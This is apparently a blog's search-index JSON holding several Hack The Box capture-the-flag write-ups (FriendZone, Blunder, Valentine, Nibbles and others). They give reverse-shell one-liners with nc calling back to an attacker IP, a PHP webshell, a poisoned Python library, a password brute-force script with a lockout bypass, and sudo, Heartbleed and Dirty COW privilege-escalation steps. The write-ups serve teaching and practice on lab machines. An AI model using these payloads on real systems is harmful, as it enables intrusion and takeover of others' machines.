secret.zipIt required a password so I tried the same password as charix‚Äôs ssh password:Charix!2#4%6&amp;8(0 and it worked !!This is a live example on the dangers of using the same password in many places‚Ä¶I can‚Äôt understand the file content righ now but I think it is a password for something, so let‚Äôs leave it now‚Ä¶Let‚Äôs transfere linpeas.sh to Poison and run it‚Ä¶I found a VNC Service running as a root on port 5901But I can not access VNC server from Poison. Let us tunnel the Poison‚Äôs port 5901 to my local box.ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84Now that SSH tunneling is done, let us try to access the server via VNC client.I tried:vnc 127.0.0.1:5901but it required a password and we had previously unzipped a secret file so let‚Äôs pass it‚Ä¶vnc -passwd secret 127.0.0.1:5901BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "FriendZone ‚Äî Hack The Box [Write-up]", "url": "/posts/FriendZone-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Linux", "date": "2022-05-06 19:00:00 +0200", "snippet": "FriendZone was a relatively easy box, but as far as easy boxes go, it had a lot of enumeration and garbage trolls to sort through. In all the enumeration, I‚Äôll find a php page with an LFI, and use SMB to read page source and upload a webshell. I‚Äôll uprivesc to the next user with creds from a database conf file, and then to root using a writable python module to exploit a root cron job calling a python script.Used Tools: Nmap Dig Smbmap Smbclient LinPeas Pspy1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.Nmap is done with open ports:21 ‚Äì&gt; FTP22 ‚Äì&gt; SSH53 ‚Äì&gt; DNS80 ‚Äì&gt; HTTP139 ‚Äì&gt; SMB443 ‚Äì&gt; HTTPS445 ‚Äì&gt; SMBTried anonymous login with FTP but unfortunately didn‚Äôt work:Let‚Äôs Jumb to the webserver‚Ä¶Just a static web page, I tried directory bruteforcing it but didn‚Äôt reach anything‚Ä¶Note: There is a domain name down there friendzoneportal.redWe know there is Port 53 open which is domain may be we can do a zone transfer for that domain. I added friedzone.red and friendzoneportal.red in /etc/hostsdig axfr @10.10.10.123 friendzone.redSuccessfully found 3 new subdomains, Added them to my /etc/hostsI tried to access administrator1.friendzone.red but found a login form with username and passwordTried SQLinjection but didn‚Äôt succeed, So I checked the other two subdomainsUpload.friendzone.red ‚Äì&gt; Have an upload button and after uploading an image nothing interested happenhr.friendzone.red ‚Äì&gt; Not FoundLet‚Äôs check SMB Service to see if there is any file availablesmbmap -H 10.10.10.123 -RFound there is a file called creds.txt in general which have a read access2. EXPLOITATION:Let‚Äôs try read general/creds.txtsmbclient -U \"\" //10.10.10.123/generalGot admin credentials, Let‚Äôs try them in administrator1.friendzone.redLogged in Successfully to page contain a message to visit /dashboardVisiting /dashboard found a page that appears tp be dealing with some sort of images and have a missing parameters due to begginer development and saying to add the missing parametersimage_id=a.jpg&amp;pagename=timestampAdding the missing parameters, The Image successfully appeared with something called timestamp displayed at the endRefreshing the page a lot of times the timestamp kept changing which indicates that it must be a php page that has the .php added automatically, So I tried to view it using LFI Wrappers‚Ä¶Let start with ‚ÄúPHP wrapper‚Äù to bypass LFI functionality.https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=timestampWe got a base64 string of the .php page contentIts Working‚Ä¶The Development share, we saw from smbmap has writable permission by the guest so why dont we upload a reverse shell there and try to access from this page.Write this exploit to a file named shell.php:&lt;?phpsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.10 4444 &gt;/tmp/f');?&gt;Then reopen the smbclient but now in the development directory and upload the shellsmbclient -U \"\" //10.10.10.123/developmentput shell.phpCreate a listener on my local machine:nc -nlvp 4444We know that the smb files are located under the /etc from our previous enumeration, So we will access our shell which is under /etc/Development/shell without .php because it is automatically addedBOOOOOOOOOOOOOOOOOOOOOOOOOOOM ! We successfully gained a shell for www-data user and the user flag is located at /home/friend/user.txt3. PRIVILEGE ESCALATION:In the /var/www there is a file called mysql_data.conf that has credentials of user friend, So we used it to upgrade from www-data to friendI Also used these creds to obtain an ssh access with themThen I ran linPeas script but it didn‚Äôt show any thing I can use so I headed to see the pspy which monitor linux processes without root permissions.But firstly I must upload it to the machine, and we all knew that /etc/development is writable so I will put the script there.At my local machine:kali@kali python3 -m http.server 8080At friendZone:wget http://10.10.16.10:8080/pspy64After sometime this appeared, root runs reporter.py every minuteThe script doesn‚Äôt do anything except it runs the os script in the import lineFrom my previous enumeration in linPeas I found that /usr/lib/python2.7/os.py is writable. So what if we put a reverse shell in this library and when the reporter.py is reruned by root it will execute the shell with root privillages. Let‚Äôs Try it‚Ä¶Firstly we will put reverse shell in os.pysystem(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.10 8888 &gt;/tmp/f\")Then we will save and open a listener in a new tab and wait a while for a connection‚Ä¶BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "Irked ‚Äî Hack The Box [Write-up]", "url": "/posts/Irked-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Linux", "date": "2022-05-05 22:00:00 +0200", "snippet": "This was an easy Linux box that involved exploiting malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive to get initial shell, Then exploiting a custom SUID binary to gain root access.Used Tools: nmap Metasploit1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.Nmap is done with port 22 (FTP), port 80 (http) and port 111 (rpcbind) open.Let‚Äôs check the web application first on port 80‚Ä¶Nothing Except the sentence below ‚ÄúIRC is almost working!‚Äù which made me suspect for having and IRC service workingIRC: https://en.wikipedia.org/wiki/Internet_Relay_ChatLet‚Äôs test its existance through this nmap scriptnmap -sV --script irc-unrealircd-backdoor -p 194,6660-7000 10.10.10.117We successfully found open IRC service on port 66972. EXPLOITATIONSearching for exploit online I found most of the exploits on version 3.2.8.1 and found an exploit for it on metasploit, So let‚Äôs try it‚Ä¶We successfully gained a shell and upgrade it to interactive shell using:python -c 'import pty;pty.spawn(\"/bin/bash\")'But our user can‚Äôt do anything and doesn‚Äôt even have privalages to read user.txt, So let‚Äôs try to find some way to upgrade it‚Ä¶3. PRIVILEGE ESCALATION:After some enumeration let‚Äôs try finding if there is a SUID files we could execute as a rootSUID: https://pentestlab.blog/2017/09/25/suid-executables/find / -perm -u=s 2&gt;/dev/nullWe found /usr/bin/viewusr and we could run it with our user but it will be executed with root premissions, Let‚Äôs try to run it‚Ä¶He prompted that there is a file called /tmp/listusers that isn‚Äôt found, and it is located in the tmp directory and any user can write on it, So we could create it in the tmp directory and write an exploit in it which will be executed as root when we run /usr/bin/viewusr again.BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "Blunder ‚Äî Hack The Box [Write-up]", "url": "/posts/Blunder-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Linux", "date": "2022-05-01 07:00:00 +0200", "snippet": "Blunder is a Linux machine rated as easy from Hack The Box, it consists on finding credentials to log in to Bludit and then use a RCE exploit to gain an initial shell, then some database files can be read in order to pivot users, finally a root shell can be spawned using sudo security bypass.Used Tools: nmap Gobuster Searchsploit Metasploit Cewl1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.Nmap is done with port 21 closed and port 80 open.The site is a blog website containing 3 posts and nothing more.Let‚Äôs try directory bruteforcing.I‚Äôll run gobsuter with -u for the url, -2 for the directory list, and -o for the output file.gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirb/common.txt -o directory.txt 2&gt;/dev/nullThe directory bruteforce finished and I found ‚Äú/admin‚Äù, ‚Äú/cgi-bin‚Äù and ‚Äú/robots.txt‚Äù./admin has an admin interface with login and password, I tried SQLInjection but reached nothing, and the cgi-bin was disabled so couldn‚Äôt proceed with attacks like shellshock and the robots.txt have nothing.After a lot of searching I tried to rerun the directory bruteforce but with different directory list:gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory2.txt 2&gt;/dev/nullI found extra: ‚Äú/install.php‚Äù, ‚Äú/todo.txt‚Äù, ‚Äú/usb‚Äù.2. EXPLOITATION:visiting /install.php discloses a potential CMS ‚ÄúBludit‚ÄùChecking /todo.txt the following notes are discovered:Noticed that the CMS version isn‚Äôt updated yet, so we need to know its current version and there is a user called fergus.Revisiting /admin is the login page, and when viewing the page source, it potentially discloses the version of bludit as 3.9.2I searched on searchsploit for bludit 3.9.2There is a metasploit module so let‚Äôs take a look for it:It require a username and a password to work‚Ä¶We remember that we have a username called fergus from so we need to get a password, let‚Äôs try bruteforcing the password by creating a password list from the common words in the website using cewl with the -d for depth of the search, -m for min length of the password and -w for the outputcewl -d 3 -m 5 -w HTB/Blunder/cewl_wordlist.txt http://10.10.10.191/After creating our password list we need to try it‚Ä¶I found a python code online for Bludit Brute Force Mitigation Bypass: https://rastating.github.io/bludit-brute-force-mitigation-bypass/After a lot of modification to make it run properly the code was as following:#!/usr/bin/env python3import reimport requestshost = 'http://10.10.10.191'login_url = host + '/admin/login'username = 'fergus'wordlist = []file = r\"/home/kali/HTB/Blunder/cewl_wordlist.txt\" # Put here the location of the password listfile=open(file,'r')for line in file: for word in line.split(): wordlist.append(word)for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search('input.+?name=\"tokenCSRF\".+?value=\"(.+?)\"', login_page.text).group(1) print('[*] Trying: {p}'.format(p = password)) headers = { 'X-Forwarded-For': password, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36', 'Referer': login_url } data = { 'tokenCSRF': csrf_token, 'username': username, 'password': password, 'save': '' } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if 'location' in login_result.headers: if '/admin/dashboard' in login_result.headers['location']: print() print('SUCCESS: Password found!') print('Use {u}:{p} to login.'.format(u = username, p = password)) print() breakAfter executing it tries different passwords till it find a valid one ‚ÄúRolandDeschain‚Äù:let‚Äôs pass it to our metasploit exploit and run it‚Ä¶We successfully gained a meterpreter shellGaining a more interactive shell:shellpython -c 'import pty;pty.spawn(\"/bin/bash\")'We are now ‚Äúwww-data‚Äù user, Traveling to /home we found 2 users: hugo, shaunVisiting hugo we found user.txt, trying to read it but permission denied.After a lot of searcing in the system I found 2 directories called ‚Äúbludit-3.10.0a‚Äù and ‚Äúbludit-3.9.2‚Äù in the /var/www directoryVisiting its bludit-3.10.0a‚Äôs content, I found a user.php file in the /var/www/bludit-3.10.0a/bl-content/databasesAfter reading it I found Hugo‚Äôs password hash, So let‚Äôs try to decode it online on https://hashtoolkit.com/decrypt-hash/‚Ä¶It found a successfull match with a password: ‚ÄúPassword120‚ÄùLet‚Äôs change user and get the user flag‚Ä¶3. PRIVILEGE ESCALATION:Let‚Äôs list user‚Äôs privileges or check a specific command:This have a public exploit exploiting ‚Äúsudo 1.8.27 - Security Bypass‚ÄùLink: https://www.exploit-db.com/exploits/47502So we could escalate our privileges using:sudo -u#-1 /bin/bashBOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "Valentine ‚Äî Hack The Box [Write-up]", "url": "/posts/Valentine-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Linux", "date": "2021-02-05 16:00:00 +0200", "snippet": "Valentine is a very unique machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.Skills Required: Beginner/Intermediate knowledge of LinuxSkills Learned: Identifying servers vulnerable to Heartbleed Exploiting Heartbleed Exploiting permissive tmux sessionsUsed Tools: Nmap Gobuster or Dirsearch Searchsploit Openssl1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.We found 3 open ports: 22 ‚Üí for SSH, 80 ‚Üí for HTTP, 443 ‚Üí for HTTPSWe opened the website but nothing appears except a single photo in a full screen mode and it doesn‚Äôt hide anything in its source code‚Ä¶So let‚Äôs enumerate the directories of the web application using gobuster‚Ä¶We found a directory called dev, encode, decode pages.So let‚Äôs check the dev directory first‚Ä¶We found 2 interesting files hype_key and notes.txt, Let‚Äôs check notes.txt first‚Ä¶The author says it would be nice to fix the encoder/decoder, keep that in mind (and yes, you‚Äôd better find another way to take notes, bro üòà).Let‚Äôs check hype_key‚Ä¶It contain a bunch of hex-decimals so let‚Äôs decode them using Hex to ASCII Text Converter:After decoding them i found that this is private RSA key encrypted with a pass phrase, We can use it to connect to the server using SSH service‚Ä¶So we have to find the pass phrase to decrypt it.Let‚Äôs check the encoder and decoder pages‚Ä¶/encode:Entered ‚Äúhackthebox‚Äù:/decode:entered ‚ÄúaGFja3RoZWJveA==‚ÄùThe purpose of these pages isn‚Äôt clear yet, although i spent alot of time in it and found reflected XSS but it couldn‚Äôt be useful in our case So we had to find something else‚Ä¶I couldn‚Äôt find any public exploits for any of the OpenSSH and Apache versions so what about the SSL version of port 443 let‚Äôs check if it is vulnerable‚Ä¶I will use nmap scripts to do a full vulnerability scan on the SSL service:nmap ‚Äî script ssl* -p 443 10.10.10.79we got a very long list of output but scrolling down i found something very interesting‚Ä¶This OpenSSL version is vulnerable to heartbleed which is is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.For more understanding of the vunerability i will refer to this sketch from xkcd comic :2. EXPLOITATIONsearchsploit heartbleed shows 4 exploits:I tried the last one‚Ä¶searchsploit -m 32745python 32745.py 10.10.10.79From the internal memory of the server, they pulled out a lineaGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== that someone presumably entered into the decoder. Let‚Äôs translate into meaningful text:We can use base64 to ascii online decoders or the Valentine decoder page or base64 command in linux as:base64 -d &lt;&lt;&lt;‚ÄùaGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==‚Äùthe decoding gives us a hint that it belong to the hype_key which we decode it and found that its an RSA encoded private key, So let‚Äôs try to decode it using this pass phrase‚Ä¶openssl rsa -in rsa.key -out rsa_decrypted.keyrsa.key ‚Üí our private keyrsa_decrypted.key ‚Üí the output of the opensslhe asked about the pass phrase and i write it, So let‚Äôs check the rsa_decrypted.key file‚Ä¶It is finally decrypted.SSH Connection:Now we can connect to Valentine via SSH with a clear conscience (the username, by the way, had to be guessed, fortunately it was not difficult):ssh -i rsa_decrypted.key hype@10.10.10.79We connected successfully and BOOOOOOOOOOM !!! Now we had a user flag :D3. PRIVILEGE ESCALATION:The kernel version hints at the possibility of using Dirty COW , but we will leave the dirty hacks as a last resort. Let‚Äôs run linPEAS which is a script that search for possible paths to escalate privileges on Linux/Unix* hosts:But first we had to transfer it from our machine to the valentine‚Ä¶ In Kali:open python server in the file that contain the linPEAS scriptpython -m SimpleHTTPServer 8080 In Valentine:wget http://10.10.16.130:8080/linpeas.shLet‚Äôs give it the proper permissions and then execute the script‚Ä¶As expected a massive amount of information showed up, But one of the best things i like about linPEAS: its coloring system as firstly he said that the red color refers that You must take a look at it as a potential vulnerability and for more the red with yellow background refers that it is 95% a vector.First at the ‚ÄúBasic Information‚Äù part he colored the kernel version with red/yellow, YES i knew it, it is old version and has Dirty COWbut let‚Äôs continue‚Ä¶STOP !!!!! we found a tmux opened session:tmux: this is a utility that allows you to manage terminal sessions, including ‚Äúfreezing‚Äù their current state with the possibility of subsequent resumption. What we will do is restore the paused session from the socket /.devs/dev_sess.We‚Äôll connect with the same command:tmux -S /.devs/dev_sessOnce we typed this command it opened the suspended tmux session with root privileges‚Ä¶BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :D3. PRIVILEGE ESCALATION ‚Äî Method 2What about our Dirty COW üòàDirty COW Vulnerability simply allows user to write on files meant to be read only.From the Large number of PoC I found this (based on changing the root entry in /etc/passwd) as the most stable and completely reversible.Dirty.c allow us to generates a new password hash on the fly and modifies /etc/passwd automaticallyFirst we‚Äôll transfer the dirty.c to the Valentine machine the same way we transfer linPEAS and then compile it‚Ä¶1st ‚Üí We transfered dirty.c2nd ‚Üí We compiled dirty.c to run on linux using gcc3rd ‚Üí Run ./dirty and it simply do the following:1- Backup the passwd file to restore it once we finish our attack2- Create a new user called firefart and ask you to enter his password3- Update the passwd file with our new user4- Remind you to restore the original state of the passwd file after escalating your privilegeNow let‚Äôs change the user to ‚Äúfirefart‚Äù, thereby granting ourselves superuser rights:BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "Sense ‚Äî Hack The Box [Write-up]", "url": "/posts/Sense-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Linux", "date": "2021-02-02 08:00:00 +0200", "snippet": "Sense, while not requiring many steps to complete, can be challenging for some as it is all about enumeration which takes long time for me then every thing goes easy as we will see.Used Tools: Nmap Gobuster or Dirsearch Metasploit1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.We found an HTTP on port 80 which automatically redirect us to HTTPS on port 443, After going through the website we found nothing but a login form for the pfsense which is an open source firewall/router computer software distribution based on FreeBSD.we tried the default credentials (admin:pfsense) but it didn‚Äôt work so let‚Äôs enumerate the directories‚Ä¶hold on, I usually use ‚Äú/usr/share/wordlists/dirb/common.txt‚Äù which is short and contain the most common directory list but when i used it here it gave me an incomplete results made me go in a very long and wrong way and finally hit a block so when i used ‚Äú/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt‚Äù it gave me extra files that put me on the right way but it took a hell of long time about an hour and half cause it contains about 661K directory.here is the results of the common.txt gobuster enumeration:Note: you must use the ‚Äìinsecuressl option to tell gobuster to ignore the unknown SSL certificate of the website.But here i used dirsearch cause i think it is a bit faster and it‚Äôs output shape is better for me.sudo python3 dirsearch.py -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -e txtWe fount changelog.txt and system-users.txt which are missing from the previous enumeration, changelog.txt contain the security changelog, Let‚Äôs check the system-users.txt‚Ä¶we fount an support ticket for a user creation called rohit with an default company password (we already have it previously)2. EXPLOITATION:During the first directories enumeration i found a metasploit module that exploits pfsense's RCE vulnerability.Module: exploit/unix/http/pfsense_graph_injection_execBut the problem was it requires a username and password and i didn‚Äôt have it previously but now after having these credentials let‚Äôs try it again‚Ä¶And the exploit succeeded, Now we have a meterpreter session let‚Äôs checl our privileges‚Ä¶BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :DYou‚Äôll find user.txt and root.txt flag at:user flag ‚Üí /home/rohit/user.txtroot flag ‚Üí /root/root.txtThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "Grandpa ‚Äî Hack The Box [Write-up]", "url": "/posts/Grandpa-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Windows", "date": "2021-01-31 07:00:00 +0200", "snippet": "Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017‚Äì7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.Grandpa and Granny are exploited nearly the same way through the exploit [CVE-2017‚Äì7269] but Granny could be exploited in other way through uploading and executing files to the server as Grandpa doesn‚Äôt allow.Granny write-up: https://0x3ashry.medium.com/granny-hack-the-box-write-up-37b2799e460eSkills Required: Basic knowledge of Windows Enumerating ports and services Basic knowledge of Metasploit usageSkills Learned: Identifying known vulnerabilities Basic Windows privilege escalation techniquesUsed Tools: nmap Searchsploit Metasploit1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.Nmap is done with only port 80 open, I also noticed webdav-scan which is particularly interesting‚Ä¶After checking the website i found nothing, it is still under development‚Ä¶ So let‚Äôs enumerate the directories:I tried to navigate through them but i hit a block wall so i had to think of other way‚Ä¶in the enumeration phase we found that webdav is enabled and we are working on IIS v6.0 so let‚Äôs look for a public exploit for it‚Ä¶2. EXPLOITATIONsearchsploit webdavWe found alot of compatible exploits but the first one ‚ÄúMicrosoft IIS 6.0 ‚Äî WebDAV ‚ÄòScStoragePathFromUrl‚Äô Remote Buffer Overflow‚Äù seems to be different than the others let‚Äôs look if metasploit have similar one‚Ä¶Awesome !!! we found a similar exploit available on metasploit so let‚Äôs use it and specify it‚Äôs options‚Ä¶Failed !!? and after long time trying to find other way i tried to restart the lab and try the same exploit again and it worked perfectly, so if it failed with you restart the lab and continue.The exploit succeeded and we successfully had a meterpreter session on the server :Dbut when we try to access Lakis to get the user flag it gives Access is deniedLet‚Äôs try to elevate our privileges‚Ä¶3. PRIVILEGE ESCALATIONLet‚Äôs checkout local exploits and we won‚Äôt get easier or better option that Metasploit‚Äôs Module (multi/recon/local_exploit_suggester)So first background you session and get it‚Äôs session iduse multi/recon/local_exploit_suggesterIt suggests a lot of local exploits, Ignore the first one cause it is not validated‚Ä¶ Let‚Äôs try ms14_058_track_popup_menuuse exploit/windows/local/ms14_058_track_popup_menuThe exploit succeeded, Let‚Äôs check our privilege level‚Ä¶BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :DYou‚Äôll find the two flags at:user ‚Üí C:\\Documents and Settings\\Harry\\Desktop\\user.txtroot‚Üí C:\\Documents and Settings\\Administrator\\Desktop\\root.txtThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "Nibbles ‚Äî Hack The Box [Write-up]", "url": "/posts/Nibbles-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Linux", "date": "2021-01-24 11:00:00 +0200", "snippet": "Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.Used Tools: Nmap Gobuster Searchsploit Metasploit Unzip1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.As seen there are 2 open ports, Port 20 for an SSH service and Port 80 for HTTP service, Let‚Äôs check the HTTP first‚Ä¶This looks empty‚Ä¶ Let‚Äôs check the page sourceSimply it contain the header for the hello world title and a comment down inform us to go to /nibbleblog/ as there is nothing here in this page, and here we goAfter a lot of navigating through the website I found nothing every thing returns me to this home page.So I google about nibbleblog and fount it is a powerful engine for creating blogs using PHP.Let‚Äôs enumerate the directories using gobuster:Of course the enumeration of the previous http://10.10.10.75/ gives nothing important, but as expected the http://10.10.10.75/nibbleblog/ gives us some promising directories as nibbleblog/admin.php and nibbleblog/README, so let‚Äôs check the README page‚Ä¶It contain a description for the site and some installation guide which we won‚Äôt use bit it gaves us its version. Let‚Äôs check the nibbleblog/admin.phpAfter a quick google didn‚Äôt bring up a set of default credentials, I tried alot of default password with the username admin but it ended up being blacklisted by the application‚Ä¶After waiting around a minute we‚Äôre taken off the blacklist and can access the login page once again. The general rule of thumb here is to think like a lazy sysadmin. After a few attempts I ended up finding the credentials admin:nibbles.2. EXPLOITATION:During i was stuck in the admin panel i searched for the Nibbleblog in the searchsploit for a public exploit:I found an exploit (38489) with the exact version of our targeted nibbleblog as seen in the README file and the more interesting that it is supported by metasploit, The exploit: Nibbleblog contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code.so let‚Äôs open metasploit and use it:The exploit require a username and a password in it‚Äôs options so then i figured that we must have a username and password so i returned to the admin panel but now we have them so we will set the options and exploit it.And the exploit succeeded, Now we have a meterpreter sessionSo let‚Äôs go to the / directory and then to the home directory where we will find a user file called nibbler, go through it we will find user.txtBOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!! Now we had a user flag :D3. PRIVILEGE ESCALATION:There are a lot of commands that couldn‚Äôt be done using the meterpreter shell so we can escape this by typing ‚Äúshell‚Äù in the meterpreter shell‚Ä¶ and then upgrade our shell usingpython3 -c ‚Äòimport pty;pty.spawn(‚Äú/bin/bash‚Äù)‚ÄôNow let‚Äôs list the user‚Äôs privileges using:sudo -lHere we go, our user (nibbler) can execute the bash script monitor.sh with root privileges, let‚Äôs check it‚Ä¶Monitor.sh is in personal but it is zipped in the nibbler directory so we have to unzip it with the unzip toolunzip personal.zipNow we have 2 options: We append a reverse shell in the bash script so when it is executed as root the reverse shell will connect us as root We overwrite the monitor.sh file with the reverse shellI will use the second one as it‚Äôs faster and easier‚Ä¶echo ‚Äòrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.130 1234 &gt;/tmp/f‚Äô &gt; monitor.shYou‚Äôll find this reverse shell payload on PayloadsAllTheThings then create a listener in other tab on the port 1234 then execute it as root using:PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.mdsudo -u root ./monitor.shBOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" } ]
